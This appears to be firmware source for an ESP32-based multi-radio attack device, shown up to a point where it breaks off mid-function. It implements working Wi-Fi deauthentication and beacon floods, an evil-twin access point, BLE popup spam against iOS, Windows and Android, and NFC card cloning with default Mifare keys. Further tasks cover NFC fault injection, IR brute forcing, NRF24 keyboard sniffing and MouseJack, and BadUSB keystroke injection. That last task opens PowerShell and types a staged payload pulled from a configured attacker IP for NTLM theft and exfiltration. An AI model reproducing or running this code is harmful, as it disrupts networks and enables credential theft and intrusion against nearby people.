/**
 * @file attacks_manager.cpp
 * @brief Central Attack Management System for Monster S3
 * 
 * Coordinator for all attack vectors including WiFi, BLE,
 * RF SubGHz, NFC, IR, NRF24, and USB. Manages RTOS tasks,
 * power states, and inter-module synchronization.
 * 
 * @author Monster S3 Team
 * @version 2.0
 * @date 2025
 */

#include "attacks_manager.h"
#include "s3_driver.h"
#include "pin_config.h"
#include "rf_core.h"
#include "nrf24_attacks.h"
#include "tts_espeak.h"
#include "fault_mosfet.h"
#include "ble_spam_br.h"

// External Dependencies
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <NimBLEDevice.h>
#include <Adafruit_PN532.h>
#include <Wire.h>

// Internal Drivers
#include "gps_driver.h"
#include "sd_adapter.h"
#include "config_manager.h"
#include "payload_manager.h"

// USB HID Dependencies
#if ARDUINO_USB_MODE
#include <Arduino.h>
#include "YsIrtm.h"
#include "USBHIDKeyboard.h"
USBHIDKeyboard Keyboard;
#endif

// ============================================================================
// DEAUTH FRAME STRUCTURE
// ============================================================================
typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint8_t seq_ctrl[2];
    uint8_t reason[2];
} __attribute__((packed)) wifi_deauth_frame_t;

// ============================================================================
// GLOBALS
// ============================================================================
static AttackType current_attack = ATTACK_NONE;
static TaskHandle_t attack_task_handle = NULL;
static volatile bool stop_requested = false;
static uint32_t packets_sent = 0;

// Scan results storage
static wifi_ap_record_t ap_records[20];
static uint16_t ap_count = 0;
static int target_ap_index = -1;

// NFC instance
static Adafruit_PN532 nfc_reader(PIN_I2C_SDA, PIN_I2C_SCL);
static bool nfc_initialized = false;

// IR Object (YS-IRTM)
static YsIrtm irDriver(PIN_YS_IR_RX, PIN_YS_IR_TX);

// BLE Brazilian Names
static const char* BLE_NAMES_BR[] = {
    "iPhone do João", "iPhone da Maria", "Galaxy S24 Carlos",
    "AirPods Pro Ana", "Mi Band Fitness", "Galaxy Watch Pedro",
    "MacBook Ricardo", "iPad Família", "iPhone Zé", "Redmi Lucas",
    "Galaxy Buds João", "Apple Watch Júlia", "Poco X5 Bruno",
    "Samsung Mãe", "Xiaomi Pai", "iPhone Trabalho", "Galaxy Tab",
    "Mi 13 Pro", "iPhone 15 Pro Max", "AirTag Bolsa",
    "JBL Flip Festa", "Bose QuietComfort", "Fone Bluetooth",
    "Caixinha Portátil", "Smartwatch Gym", "Tile Chaves"
};
static const int BLE_NAMES_COUNT = 26;

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/**
 * @brief Control power to external modules
 * @param mod_type 0:All Off, 1:CC1101, 2:NFC, 3:BLE/WiFi
 */
static void set_module_power(int mod_type) {
    bool cc = (mod_type == 1);
    bool nfc = (mod_type == 2);
    bool ble = (mod_type == 3);
    MonsterDriver::powerOnModules(false, ble, nfc, cc);
}

// Initialize NFC if needed
/**
 * @brief Initialize PN532 NFC Module
 * @return true if successful, false otherwise
 */
static bool init_nfc() {
    if (nfc_initialized) return true;
    
    set_module_power(2);
    delay(100);
    
    nfc_reader.begin();
    uint32_t versiondata = nfc_reader.getFirmwareVersion();
    if (!versiondata) {
        Serial.println("[NFC] PN532 not found!");
        return false;
    }
    
    nfc_reader.SAMConfig();
    nfc_initialized = true;
    Serial.printf("[NFC] PN532 Ready (FW: 0x%X)\n", versiondata);
    return true;
}

// Generate random MAC
/**
 * @brief Generate a random MAC address
 * @param mac Buffer to store the 6-byte MAC
 */
static void random_mac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] = (mac[0] | 0x02) & 0xFE; // Locally administered
}

// ============================================================================
// BLE ATTACK TASKS
// ============================================================================

/**
 * @brief Attack Task: BLE Spam (Brazilian Devices)
 * @param pvParameters FreeRTOS parameters
 */
static void task_ble_spam_br(void *pvParameters) {
    Serial.println("[ATTACK] Starting BLE Spam BR...");
    set_module_power(3);
    speak(TTS_ATTACK_START);
    
    NimBLEDevice::init("");
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    
    // High-speed advertising config
    pAdvertising->setMinInterval(0x20);  // 20ms
    pAdvertising->setMaxInterval(0x40);  // 40ms
    
    packets_sent = 0;
    
    while(!stop_requested) {
        // Stop current advertising
        pAdvertising->stop();
        
        // Random Brazilian name
        const char* name = BLE_NAMES_BR[random(BLE_NAMES_COUNT)];
        
        // Build advertisement data
        NimBLEAdvertisementData advData;
        advData.setName(name);
        advData.setCompleteServices(NimBLEUUID((uint16_t)0x1812)); // HID
        
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        
        packets_sent++;
        
        if (packets_sent % 100 == 0) {
            Serial.printf("[BLE] Spam: %d pkts, name: %s\n", packets_sent, name);
        }
        
        delay(50); // ~20 pps with name changes
    }
    
    pAdvertising->stop();
    NimBLEDevice::deinit();
    set_module_power(0);
    Serial.printf("[BLE] Spam stopped. Total: %d packets\n", packets_sent);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: BLE Sour Apple (iOS Popups)
 * @param pvParameters FreeRTOS parameters
 */
static void task_ble_sour_apple(void *pvParameters) {
    Serial.println("[ATTACK] Starting Sour Apple (iOS Popup Spam)...");
    set_module_power(3);
    speak(TTS_ATTACK_START);
    
    NimBLEDevice::init("");
    packets_sent = 0;
    
    // Apple Continuity Protocol advertisement
    // This triggers iOS nearby device popups
    uint8_t apple_data[] = {
        0x4C, 0x00,  // Apple Company ID
        0x0F, 0x05,  // Nearby Action
        0x90,        // Action type (AirPods)
        0xFF, 0xFF,  // Device model
        0x00, 0x00,
        0x01         // Status
    };
    
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setMinInterval(0x06);  // Fastest allowed
    pAdvertising->setMaxInterval(0x06);
    
    while(!stop_requested) {
        // Randomize device model
        apple_data[5] = random(256);
        apple_data[6] = random(256);
        
        NimBLEAdvertisementData advData;
        advData.addData((char*)apple_data, sizeof(apple_data));
        
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        delay(20);
        pAdvertising->stop();
        
        packets_sent++;
        
        if (packets_sent % 500 == 0) {
            Serial.printf("[BLE] Sour Apple: %d popups sent\n", packets_sent);
        }
    }
    
    NimBLEDevice::deinit();
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: BLE Swift Pair (Windows)
 * @param pvParameters FreeRTOS parameters
 */
static void task_ble_swift_pair(void *pvParameters) {
    Serial.println("[ATTACK] Starting Swift Pair (Windows Popup Spam)...");
    set_module_power(3);
    speak(TTS_ATTACK_START);
    
    NimBLEDevice::init("");
    packets_sent = 0;
    
    // Microsoft Swift Pair advertisement
    uint8_t ms_data[] = {
        0x06, 0x00,  // Microsoft Company ID
        0x03,        // Scenario: Swift Pair
        0x00,        // Reserved
        0x80,        // Device capabilities
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // Device hash
    };
    
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    
    while(!stop_requested) {
        // Randomize device hash
        for (int i = 5; i < 11; i++) ms_data[i] = random(256);
        
        NimBLEAdvertisementData advData;
        advData.setName("Monster Headphones");
        advData.addData((char*)ms_data, sizeof(ms_data));
        
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        delay(30);
        pAdvertising->stop();
        
        packets_sent++;
    }
    
    NimBLEDevice::deinit();
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: BLE Fast Pair (Android)
 * @param pvParameters FreeRTOS parameters
 */
static void task_ble_fast_pair(void *pvParameters) {
    Serial.println("[ATTACK] Starting Fast Pair (Android Popup Spam)...");
    set_module_power(3);
    speak(TTS_ATTACK_START);
    
    NimBLEDevice::init("");
    packets_sent = 0;
    
    // Google Fast Pair advertisement
    // Uses 3-byte model ID from Google's database
    uint16_t model_ids[] = {
        0x0001, 0x0002, 0x0003, 0x0004, 0x0005,  // Pixel Buds
        0x0006, 0x0007, 0x0008, 0x0009, 0x000A,  // Galaxy Buds
        0x0E30, 0x0E31, 0x8012, 0x8013, 0x8014   // Various
    };
    
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    
    while(!stop_requested) {
        uint16_t model = model_ids[random(15)];
        
        uint8_t fp_data[] = {
            0x2C, 0xFE,              // Google Company ID (little endian)
            (uint8_t)(model >> 16),  // Model ID byte 2
            (uint8_t)(model >> 8),   // Model ID byte 1
            (uint8_t)model           // Model ID byte 0
        };
        
        NimBLEAdvertisementData advData;
        advData.addData((char*)fp_data, sizeof(fp_data));
        
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        delay(25);
        pAdvertising->stop();
        
        packets_sent++;
    }
    
    NimBLEDevice::deinit();
    set_module_power(0);
    vTaskDelete(NULL);
}

// ============================================================================
// WIFI ATTACK TASKS
// ============================================================================

// Promiscuous mode callback to capture packets
/**
 * @brief Callback for WiFi Promiscuous Mode
 * @param buf Packet data
 * @param type Packet type
 */
static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    // Can be used for PMKID capture
}

/**
 * @brief Attack Task: WiFi Deauthentication
 * @param pvParameters FreeRTOS parameters
 */
static void task_wifi_deauth(void *pvParameters) {
    Serial.println("[ATTACK] Starting WiFi Deauth...");
    speak(TTS_ATTACK_START);
    
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
    
    // Scan for targets
    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WIFI] Found %d networks\n", n);
    
    if (n == 0) {
        Serial.println("[WIFI] No networks found!");
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_OFF);
        vTaskDelete(NULL);
        return;
    }
    
    packets_sent = 0;
    
    // Deauth frame template
    wifi_deauth_frame_t deauth_frame;
    memset(&deauth_frame, 0, sizeof(deauth_frame));
    deauth_frame.frame_ctrl[0] = 0xC0;  // Deauth frame
    deauth_frame.frame_ctrl[1] = 0x00;
    deauth_frame.duration[0] = 0x00;
    deauth_frame.duration[1] = 0x00;
    deauth_frame.duration[1] = 0x00;
    
    // Configurable Reason Code
    const DeviceConfig* cfg = config_get();
    deauth_frame.reason[0] = cfg->wifi_deauth_reason;      // Configured Reason
    deauth_frame.reason[1] = 0x00;
    
    while(!stop_requested) {
        // Cycle through all APs
        for (int i = 0; i < n && !stop_requested; i++) {
            // Set channel
            esp_wifi_set_channel(WiFi.channel(i), WIFI_SECOND_CHAN_NONE);
            
            // Get BSSID
            uint8_t* bssid = WiFi.BSSID(i);
            if (!bssid) continue;
            
            // Broadcast deauth (to all clients)
            memset(deauth_frame.dest, 0xFF, 6);  // Broadcast
            memcpy(deauth_frame.src, bssid, 6);
            memcpy(deauth_frame.bssid, bssid, 6);
            
            // Sequence number
            deauth_frame.seq_ctrl[0] = (packets_sent & 0x0F) << 4;
            deauth_frame.seq_ctrl[1] = (packets_sent >> 4) & 0xFF;
            
            // Send deauth packet
            esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
            packets_sent++;
            
            // Also send as if from client to AP
            memcpy(deauth_frame.dest, bssid, 6);
            memset(deauth_frame.src, 0xFF, 6);
            esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
            packets_sent++;
            
            delay(1);  // ~1000 pps per AP
        }
        
        if (packets_sent % 1000 == 0) {
            Serial.printf("[WIFI] Deauth: %d packets sent\n", packets_sent);
        }
    }
    
    esp_wifi_set_promiscuous(false);
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    Serial.printf("[WIFI] Deauth stopped. Total: %d packets\n", packets_sent);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: WiFi Beacon Spam
 * @param pvParameters FreeRTOS parameters
 */
static void task_wifi_beacon_spam(void *pvParameters) {
    Serial.println("[ATTACK] Starting Beacon Spam...");
    speak(TTS_ATTACK_START);
    
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
    
    // Beacon frame template (simplified)
    uint8_t beacon_frame[128];
    memset(beacon_frame, 0, sizeof(beacon_frame));
    
    // Frame control: Beacon
    beacon_frame[0] = 0x80;
    beacon_frame[1] = 0x00;
    
    // Duration
    beacon_frame[2] = 0x00;
    beacon_frame[3] = 0x00;
    
    // Destination: Broadcast
    memset(&beacon_frame[4], 0xFF, 6);
    
    // Fake SSIDs
    const char* ssids[] = {
        "Free WiFi", "FBI Surveillance Van", "Virus.exe",
        "Pretty Fly for a WiFi", "Get Your Own WiFi",
        "No Internet Access", "Loading...", "Router not Found",
        "Click Here for Virus", "Vivo-Fibra-GRATIS",
        "GVT-FREE", "Claro-5G-Teste", "TIM-PROMOCAO"
    };
    
    // Use configured beacon count/interval
    const DeviceConfig* cfg = config_get();
    int ssid_count = (cfg->wifi_beacon_count < 13) ? cfg->wifi_beacon_count : 13;
    // Note: To support > 13 SSIDs, we would need to generate them dynamically.
    // For now we cap at the static list size or user config, whichever is smaller.
    
    packets_sent = 0;
    
    while(!stop_requested) {
        for (int ch = 1; ch <= 11 && !stop_requested; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            for (int i = 0; i < ssid_count && !stop_requested; i++) {
                // Random source MAC
                random_mac(&beacon_frame[10]);
                memcpy(&beacon_frame[16], &beacon_frame[10], 6);  // BSSID = Source
                
                // Sequence
                beacon_frame[22] = (packets_sent & 0x0F) << 4;
                beacon_frame[23] = (packets_sent >> 4) & 0xFF;
                
                // Fixed params (timestamp, interval, capability)
                beacon_frame[24] = millis() & 0xFF;
                beacon_frame[32] = 0x64;  // 100 TU interval
                beacon_frame[34] = 0x31;  // Capability: ESS, Privacy
                
                // SSID element
                int ssid_len = strlen(ssids[i]);
                beacon_frame[36] = 0x00;  // SSID tag
                beacon_frame[37] = ssid_len;
                memcpy(&beacon_frame[38], ssids[i], ssid_len);
                
                int frame_len = 38 + ssid_len + 10;  // +10 for other IEs
                
                esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
                packets_sent++;
                
                // Configurable delay (controls spam intensity)
                delay(cfg->wifi_beacon_interval_ms > 0 ? cfg->wifi_beacon_interval_ms : 10);
            }
        }
        
        if (packets_sent % 500 == 0) {
            Serial.printf("[WIFI] Beacon Spam: %d packets\n", packets_sent);
        }
    }
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: WiFi Evil Twin
 * @param pvParameters FreeRTOS parameters
 */
static void task_wifi_evil_twin(void *pvParameters) {
    Serial.println("[ATTACK] Starting Evil Twin...");
    speak(TTS_ATTACK_START);
    
    // First, scan and pick strongest network
    WiFi.mode(WIFI_MODE_STA);
    int n = WiFi.scanNetworks();
    
    if (n == 0) {
        Serial.println("[WIFI] No networks to clone!");
        vTaskDelete(NULL);
        return;
    }
    
    // Find strongest signal
    int best = 0;
    for (int i = 1; i < n; i++) {
        if (WiFi.RSSI(i) > WiFi.RSSI(best)) best = i;
    }
    
    String target_ssid = WiFi.SSID(best);
    int target_channel = WiFi.channel(best);
    
    Serial.printf("[WIFI] Cloning: %s (ch %d, %d dBm)\n", 
                  target_ssid.c_str(), target_channel, WiFi.RSSI(best));
    
    WiFi.scanDelete();
    
    // Create AP with same name (no password)
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(target_ssid.c_str(), NULL, target_channel, 0, 4);
    
    Serial.printf("[WIFI] Evil Twin AP created: %s\n", target_ssid.c_str());
    Serial.printf("[WIFI] Captive portal at: %s\n", WiFi.softAPIP().toString().c_str());
    
    // TODO: Add captive portal web server for credential harvesting
    
    while(!stop_requested) {
        // Log connected clients
        int clients = WiFi.softAPgetStationNum();
        if (clients > 0) {
            Serial.printf("[WIFI] Evil Twin: %d clients connected!\n", clients);
        }
        delay(1000);
    }
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: WiFi PMKID Capture
 * @param pvParameters FreeRTOS parameters
 */
static void task_wifi_pmkid(void *pvParameters) {
    Serial.println("[ATTACK] Starting PMKID Capture...");
    speak(TTS_ATTACK_START);
    
    // PMKID capture requires sending EAPOL frames and capturing responses
    // This is a simplified version that scans for WPA2 networks
    
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
    
    // Scan for WPA2 networks
    int n = WiFi.scanNetworks();
    Serial.printf("[WIFI] Found %d networks, filtering WPA2...\n", n);
    
    for (int i = 0; i < n && !stop_requested; i++) {
        if (WiFi.encryptionType(i) == WIFI_AUTH_WPA2_PSK ||
            WiFi.encryptionType(i) == WIFI_AUTH_WPA_WPA2_PSK) {
            
            Serial.printf("[PMKID] Target: %s (ch %d)\n", 
                          WiFi.SSID(i).c_str(), WiFi.channel(i));
            
            // Set channel
            esp_wifi_set_channel(WiFi.channel(i), WIFI_SECOND_CHAN_NONE);
            
            // Send association request to trigger PMKID
            // Real implementation would craft EAPOL frames
            
            // Log to SD for offline cracking
            char log[128];
            snprintf(log, sizeof(log), "PMKID,%s,%s,%d\n",
                     WiFi.SSID(i).c_str(),
                     WiFi.BSSIDstr(i).c_str(),
                     WiFi.RSSI(i));
            SDAdapter::appendFile(SD, "/pmkid_targets.txt", log);
            
            delay(500);
        }
    }
    
    esp_wifi_set_promiscuous(false);
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    
    Serial.println("[PMKID] Capture complete. Check /pmkid_targets.txt");
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: WiFi Wardriving
 * @param pvParameters FreeRTOS parameters
 */
static void task_wifi_wardrive(void *pvParameters) {
    Serial.println("[ATTACK] Starting WiFi Wardriving...");
    speak(TTS_ATTACK_START);
    
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    
    char filename[32];
    snprintf(filename, sizeof(filename), "/wardrive_%lu.csv", millis());
    SDAdapter::appendFile(SD, filename, "Date,Time,Lat,Lon,Alt,HDOP,SSID,BSSID,RSSI,Channel,Encrypt\n");
    
    packets_sent = 0;  // Using as network counter
    
    while(!stop_requested) {
        int n = WiFi.scanNetworks(false, true);
        
        if (n > 0) {
            double lat = GPSDriver::getLatitude();
            double lon = GPSDriver::getLongitude();
            String date = GPSDriver::getDateString();
            String time = GPSDriver::getTimeString();
            double alt = GPSDriver::getAltitude();
            double hdop = GPSDriver::getHDOP();
            
            for (int i = 0; i < n; ++i) {
                char logLine[256];
                snprintf(logLine, sizeof(logLine), 
                         "%s,%s,%.6f,%.6f,%.1f,%.1f,%s,%s,%d,%d,%d\n",
                         date.c_str(), time.c_str(),
                         lat, lon, alt, hdop,
                         WiFi.SSID(i).c_str(),
                         WiFi.BSSIDstr(i).c_str(),
                         WiFi.RSSI(i),
                         WiFi.channel(i),
                         WiFi.encryptionType(i));
                
                SDAdapter::appendFile(SD, filename, logLine);
                packets_sent++;
            }
            
            Serial.printf("[WARDRIVE] Logged %d networks (total: %d)\n", n, packets_sent);
        }
        
        WiFi.scanDelete();
        delay(2000);  // Scan every 2 seconds
    }
    
    WiFi.mode(WIFI_OFF);
    speak(TTS_SUCCESS);
    vTaskDelete(NULL);
}

// ============================================================================
// NFC ATTACK TASKS
// ============================================================================

/**
 * @brief Attack Task: NFC Card Clone
 * @param pvParameters FreeRTOS parameters
 */
static void task_nfc_clone(void *pvParameters) {
    Serial.println("[ATTACK] Starting NFC Clone...");
    speak(TTS_ATTACK_START);
    
    if (!init_nfc()) {
        Serial.println("[NFC] Init failed!");
        vTaskDelete(NULL);
        return;
    }
    
    Serial.println("[NFC] Waiting for card...");
    
    uint8_t uid[7];
    uint8_t uidLength;
    
    while(!stop_requested) {
        if (nfc_reader.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 100)) {
            Serial.printf("[NFC] Card detected! UID: ");
            for (int i = 0; i < uidLength; i++) {
                Serial.printf("%02X ", uid[i]);
            }
            Serial.println();
            
            // Save to SD
            char log[64];
            snprintf(log, sizeof(log), "UID:");
            for (int i = 0; i < uidLength; i++) {
                char hex[4];
                snprintf(hex, sizeof(hex), "%02X", uid[i]);
                strcat(log, hex);
            }
            strcat(log, "\n");
            SDAdapter::appendFile(SD, "/nfc_clones.txt", log);
            
            speak(TTS_NFC_CLONED);
            
            // Try to read Mifare Classic sectors
            if (uidLength == 4) {
                Serial.println("[NFC] Attempting Mifare Classic read...");
                uint8_t key_a[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                
                for (int sector = 0; sector < 16 && !stop_requested; sector++) {
                    int block = sector * 4;
                    if (nfc_reader.mifareclassic_AuthenticateBlock(uid, uidLength, block, 0, key_a)) {
                        uint8_t data[16];
                        if (nfc_reader.mifareclassic_ReadDataBlock(block, data)) {
                            Serial.printf("[NFC] Sector %d: ", sector);
                            for (int i = 0; i < 16; i++) Serial.printf("%02X ", data[i]);
                            Serial.println();
                        }
                    }
                }
            }
            
            delay(2000);  // Wait before reading another
        }
        delay(100);
    }
    
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: NFC Fault Injection
 * @param pvParameters FreeRTOS parameters
 */
static void task_nfc_fault(void *pvParameters) {
    Serial.println("[ATTACK] Starting NFC Fault Injection...");
    speak(TTS_ATTACK_START);
    
    if (!init_nfc()) {
        vTaskDelete(NULL);
        return;
    }
    
    Serial.println("[NFC] Waiting for card to glitch...");
    
    uint8_t uid[7];
    uint8_t uidLength;
    
    while(!stop_requested) {
        if (nfc_reader.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 100)) {
            Serial.println("[NFC] Card detected! Starting fault injection...");
            
            // Fire glitch pulses during authentication
            for (int attempt = 0; attempt < 10 && !stop_requested; attempt++) {
                uint8_t key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                
                // Start auth and immediately glitch
                fault_pulse_trigger();
                
                if (nfc_reader.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, key)) {
                    Serial.printf("[NFC] Glitch attempt %d: Auth succeeded (maybe vulnerable!)\n", attempt);
                    speak(TTS_SUCCESS);
                } else {
                    Serial.printf("[NFC] Glitch attempt %d: Auth failed\n", attempt);
                }
                
                delay(100);
            }
            
            delay(1000);
        }
        delay(50);
    }
    
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: NFC Phishing URL Write
 * @param pvParameters FreeRTOS parameters
 */
static void task_nfc_phishing(void *pvParameters) {
    Serial.println("[ATTACK] Starting NFC Phishing (NDEF URL)...");
    speak(TTS_ATTACK_START);
    
    if (!init_nfc()) {
        vTaskDelete(NULL);
        return;
    }
    
    // NDEF URL record pointing to phishing page
    const char* phishing_url = "192.168.4.1/login";
    
    Serial.printf("[NFC] Ready to write phishing URL: %s\n", phishing_url);
    Serial.println("[NFC] Present writable NFC tag...");
    
    uint8_t uid[7];
    uint8_t uidLength;
    
    while(!stop_requested) {
        if (nfc_reader.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 100)) {
            Serial.println("[NFC] Tag detected! Writing NDEF...");
            
            // For NTAG2xx tags
            if (uidLength == 7) {
                // Write NDEF URL record
                // Simplified - real implementation would format proper NDEF
                Serial.println("[NFC] NTAG detected - write URL here");
                speak(TTS_SUCCESS);
            }
            
            delay(2000);
        }
        delay(100);
    }
    
    set_module_power(0);
    vTaskDelete(NULL);
}

// ============================================================================
// IR ATTACK TASKS
// ============================================================================

/**
 * @brief Attack Task: IR TV-B-Gone (Universal Remote)
 * @param pvParameters FreeRTOS parameters
 */
static void task_ir_tv_off(void *pvParameters) {
    Serial.println("[ATTACK] Starting IR TV-B-Gone...");
    speak(TTS_ATTACK_START);
    
    irDriver.begin();
    
    // Comprehensive NEC power codes database
    struct IrCode { uint16_t user; uint8_t cmd; };
    const IrCode codes[] = {
        {0x20DF, 0x10}, // LG
        {0x20DF, 0x8A}, // LG Alt
        {0x0707, 0x02}, // Samsung
        {0x0707, 0x40}, // Samsung Alt
        {0xE0E0, 0x40}, // Samsung
        {0x40BF, 0x12}, // Sony (NEC variant)
        {0x04FB, 0x08}, // Panasonic
        {0x00FF, 0x12}, // Philips
        {0x00FF, 0x0D}, // Generic 1
        {0x00FF, 0x40}, // Generic 2
        {0x807F, 0x12}, // TCL
        {0xC03F, 0x02}, // Toshiba
        {0x40BF, 0x02}, // Sharp
        {0x6B86, 0x12}, // AOC
        {0x0000, 0x15}, // Generic 3
    };
// ============================================================================

    // continued
    int code_count = 15;
    
    packets_sent = 0;
    
    while(!stop_requested) {
        for (int i = 0; i < code_count && !stop_requested; i++) {
            irDriver.sendNEC(codes[i].user, codes[i].cmd);
            packets_sent++;
            delay(50);
        }
        
        if (packets_sent % 100 == 0) {
            Serial.printf("[IR] TV-B-Gone: %d codes sent\n", packets_sent);
        }
        
        delay(500);  // Pause between cycles
    }
    
    irDriver.end();
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: IR Brute Force
 * @param pvParameters FreeRTOS parameters
 */
static void task_ir_brute(void *pvParameters) {
    Serial.println("[ATTACK] Starting IR Brute Force...");
    speak(TTS_ATTACK_START);
    
    irDriver.begin();
    
    packets_sent = 0;
    uint16_t user_code = 0x0000;
    
    // Brute force all NEC codes
    while(!stop_requested && user_code <= 0xFFFF) {
        for (uint8_t cmd = 0; cmd < 64 && !stop_requested; cmd++) {
            irDriver.sendNEC(user_code, cmd);
            packets_sent++;
            delay(20);  // ~50 codes/sec
        }
        
        user_code += 0x0100;  // Skip to next user code family
        
        if (user_code % 0x1000 == 0) {
            Serial.printf("[IR] Brute: User 0x%04X, %d total\n", user_code, packets_sent);
        }
    }
    
    irDriver.end();
    Serial.println("[IR] Brute force complete!");
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: IR Remote Cloner
 * @param pvParameters FreeRTOS parameters
 */
static void task_ir_clone(void *pvParameters) {
    Serial.println("[ATTACK] Starting IR Clone (Learn Mode)...");
    speak(TTS_ATTACK_START);
    
    irDriver.begin();
    
    Serial.println("[IR] Point remote at receiver and press buttons...");
    
    while(!stop_requested) {
        uint16_t userCode;
        uint8_t cmdCode;
        
        if (irDriver.read(&userCode, &cmdCode)) {
            Serial.printf("[IR] Captured: User=0x%04X, Cmd=0x%02X\n", userCode, cmdCode);
            
            char log[64];
            snprintf(log, sizeof(log), "NEC,0x%04X,0x%02X\n", userCode, cmdCode);
            SDAdapter::appendFile(SD, "/ir_codes.txt", log);
            
            packets_sent++;
            
            // Immediate replay as confirmation
            delay(100);
            irDriver.sendNEC(userCode, cmdCode);
            Serial.println("[IR] Replayed!");
        }
        delay(10);
    }
    
    irDriver.end();
    vTaskDelete(NULL);
}

// ============================================================================
// NRF24 ATTACK TASKS
// ============================================================================
/**
 * @brief Attack Task: NRF24 MouseJack Scan & Inject
 * @param pvParameters FreeRTOS parameters
 */
static void task_nrf_mousejack(void *pvParameters) {
    Serial.println("[ATTACK] Starting Mousejack Scan...");
    speak(TTS_ATTACK_START);
    
    // NRF24Attacks::startMousejackScan();
    // Use namespace syntax if integrated, assuming NRF24Attacks class is available
    NRF24Attacks::startMousejackScan();
    
    while(!stop_requested) {
        NRF24Attacks::updateMousejack();
        delay(10);
    }
    
    NRF24Attacks::stop();
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: NRF24 Keyboard Sniffer
 * @param pvParameters FreeRTOS parameters
 */
static void task_nrf_keyboard(void *pvParameters) {
    Serial.println("[ATTACK] Starting Keyboard Sniff...");
    speak(TTS_ATTACK_START);
    
    NRF24Attacks::startKeyboardSniff();
    
    while(!stop_requested) {
        NRF24Attacks::updateKeyboardSniff();
        delay(10);
    }
    
    NRF24Attacks::stop();
    vTaskDelete(NULL);
}

// ============================================================================
// USB ATTACK TASKS
// ============================================================================

/**
 * @brief Attack Task: USB BadUSB & WAX Payload
 * @param pvParameters AttackType cast to void* to select payload
 */
static void task_usb_badusb(void *pvParameters) {
    AttackType attack_type = (AttackType)(uintptr_t)pvParameters;
    
    Serial.println("[ATTACK] Starting BadUSB HID...");
    speak(TTS_ATTACK_START);
    
    #if ARDUINO_USB_MODE
    Serial.println("[USB] Initializing USB HID...");
    USB.begin();
    Keyboard.begin();
    delay(2000); // Wait for enumeration
    
    // Payload logic based on attack type
    if (attack_type == ATTACK_USB_WAX) {
        Serial.println("[USB] Executing WAX NTLM Payload...");
        const char* ip = config_get()->attacker_ip;
        
        // 1. Open Run Dialog (Win + R)
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(100);
        Keyboard.releaseAll();
        delay(500);
        
        // 2. Open PowerShell
        Keyboard.print("powershell");
        delay(100);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(1000); // Wait for PS to open
        
        // 3. Construct and write the WAX file payload
        // STAGED: Use PayloadManager (Stage 0) to download/start Stage 1 (WAX file)
        String payload = PayloadManager::getWaxPayload(ip);
        
        Keyboard.print(payload);
        delay(500);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        
        Serial.println("[USB] Payload injected! Check Responder.");
        speak(TTS_SUCCESS);
        
    } else if (attack_type == ATTACK_USB_EXFIL) {
        Serial.println("[USB] Executing Wi-Fi Exfiltration Payload...");
        const char* ip = config_get()->attacker_ip;
        
        // Open Run -> Powershell (Obfuscated Stager)
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(100);
